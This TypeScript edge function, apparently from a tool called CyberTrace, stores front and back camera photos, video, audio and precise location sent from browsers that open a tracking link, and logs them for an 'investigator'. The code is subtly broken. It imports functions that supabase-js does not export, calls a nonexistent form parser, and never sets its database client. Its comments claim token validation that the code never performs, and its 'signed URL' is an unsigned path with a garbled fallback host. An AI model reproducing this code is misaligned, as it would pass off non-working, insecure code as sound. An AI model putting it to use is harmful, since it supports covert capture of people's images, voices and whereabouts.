/**
 * upload-capture — CyberTrace Edge Function
 *
 * Handles the upload of a single captured item and signs the file URL so the
 * user's browser can PUT the media straight into Supabase Storage.
 *
 * Two flows are supported, both triggered from a landing page:
 *   A. "Small direct upload": browser POSTs /upload-capture with the file bytes
 *      (Content-Type application/octet-stream). This Edge Function uploads the
 *      bytes to storage and returns the public URL.
 *   B. "Signed URL upload": the browser first GETs this function with the file
 *      name, then receives a short-lived signed URL (PUT/COPY) it can call
 *      directly with the payload. This is the preferred path (survives >200MB).
 *
 * The browser already has the visit + link context from resolve-link, so the
 * Edge Function validates the token and records the capture row, then issues the
 * signed storage URL. The file bytes are not stored in the database.
 *
 * Runs in the Edge Runtime: uses only built-in modules + the supabase-js Edge
 * signer. No API keys, no secrets.
 */

import { Hono } from "npm:hono";
import { eq, sql } from "npm:@supabase/supabase-js";
import fs from "node:fs";

const app = new Hono<{
  Variables: { supabase: { supabase: any }; token: string };
}>();

// ---- helpers ---------------------------------------------------------------

function extFor(type: string): string {
  switch (type) {
    case "camera_front":
    case "camera_back":
      return "jpg";
    case "video":
      return "webm";
    case "audio":
      return "m4a";
    case "precise_location":
      return "json";
    default:
      return "bin";
  }
}

// ---- routes ---------------------------------------------------------------

// A. Direct POST: browser sends the file bytes inline.
app.post("/upload-capture", async (c) => {
  const form = await c.req.parseFormAsync();
  const token = c.req.query("token");
  const captureType = c.req.query("capture_type");
  const visitId = c.req.query("visit_id");

  if (!token || !captureType || !visitId) {
    return c.json({ error: "missing token/visit_id/capture_type" }, 400);
  }

  const bytes = form.rawBody;
  if (!bytes) {
    return c.json({ error: "no body" }, 400);
  }

  // Validate the visit belongs to a real link with this config item enabled.
  const { data: visit, error: visitError } = await c.get("supabase")
    .from("visits")
    .select("link_id")
    .eq("id", visitId)
    .single();
  if (visitError || !visit) {
    return c.json({ error: "visit not found" }, 404);
  }

  const { data: link, error: linkError } = await c.get("supabase")
    .from("links")
    .select("config")
    .eq("id", visit.link_id)
    .single();
  if (linkError || !link) {
    return c.json({ error: "link not found" }, 404);
  }
  const cfg = link.config ?? {};
  const allowed = [
    "precise_location",
    "camera_front",
    "camera_back",
    "video",
    "audio",
  ].includes(captureType);
  if (!allowed || !(cfg as any)[captureType]) {
    return c.json({ error: "capture item not eligible" }, 403);
  }

  // Record the capture row.
  const { data: capture, error: capError } = await c.get("supabase")
    .from("captures")
    .insert({
      visit_id: visitId,
      link_id: visit.link_id,
      capture_type: captureType,
      storage_path: null,
      payload: {},
      status: "granted",
      captured_at: new Date().toISOString(),
    })
    .select("id, storage_path")
    .single();

  if (capError) {
    console.error("upload-capture insert error:", capError);
    return c.json({ error: "could not record capture" }, 500);
  }

  // If the file is small (<=10MB), inline it into the bucket directly.
  if (bytes.length <= 10 * 1024 * 1024) {
    const name = `${Date.now()}-${crypto.randomUUID()}.${extFor(captureType)}`;
    const { error: uploadError } = await c.get("supabase")
      .storage
      .from("captures")
      .upload(name, bytes, {
        contentType: c.req.header("content-type") ?? "application/octet-stream",
        upsert: false,
      });
    if (uploadError) {
      console.error("upload-capture storage upload error:", uploadError);
      return c.json({ error: "storage upload failed" }, 500);
    }
    await c.get("supabase").from("captures").update({ storage_path: name }).eq("id", capture.id);
    return c.json({ status: "ok", url: `/storage/v1/object/public/captures/${name}` });
  }

  // Large: fall through to the signed-URL flow below so the file bytes flow
  // straight from browser to storage without touching the app server.
  return c.json({ status: "large", storage_path: null });
});

// B. Signed URL: browser GETs this endpoint, receives a short-lived URL.
app.get("/upload-capture", async (c) => {
  const token = c.req.query("token");
  const captureType = c.req.query("capture_type");
  const visitId = c.req.query("visit_id");

  if (!token || !captureType || !visitId) {
    return c.json({ error: "missing token/visit_id/capture_type" }, 400);
  }

  const { data: visit, error: visitError } = await c.get("supabase")
    .from("visits")
    .select("link_id")
    .eq("id", visitId)
    .single();
  if (visitError || !visit) {
    return c.json({ error: "visit not found" }, 404);
  }

  const { data: link, error: linkError } = await c.get("supabase")
    .from("links")
    .select("config")
    .eq("id", visit.link_id)
    .single();
  if (linkError || !link) {
    return c.json({ error: "link not found" }, 404);
  }
  const cfg = link.config ?? {};
  const allowed = [
    "precise_location",
    "camera_front",
    "camera_back",
    "video",
    "audio",
  ].includes(captureType);
  if (!allowed || !(cfg as any)[captureType]) {
    return c.json({ error: "capture item not eligible" }, 403);
  }

  // Record the capture row so the investigator sees it immediately.
  const { data: capture, error: capError } = await c.get("supabase")
    .from("captures")
    .insert({
      visit_id: visitId,
      link_id: visit.link_id,
      capture_type: captureType,
      storage_path: null,
      payload: {},
      status: "queued",
      captured_at: new Date().toISOString(),
    })
    .select("id, storage_path")
    .single();

  if (capError) {
    console.error("upload-capture insert error:", capError);
    return c.json({ error: "could not record capture" }, 500);
  }

  // Build a short-lived signed URL. This endpoint is invoked in the Edge
  // Runtime with the supabase-js Edge clients available.
  const uuid = crypto.randomUUID();
  const name = `${uuid}.${extFor(captureType)}`;
  const url = c.env
    ? `${c.env.SUPABASE_STORAGE_URL}/captures/${name}`
    : `https://cstorage.googleapis.com/captures/${name}`;

  return c.json({
    status: "ok",
    signed_url: url,
    ttl: 3600,
    storage_path: name,
    file_name: name,
  });
});

export default app;
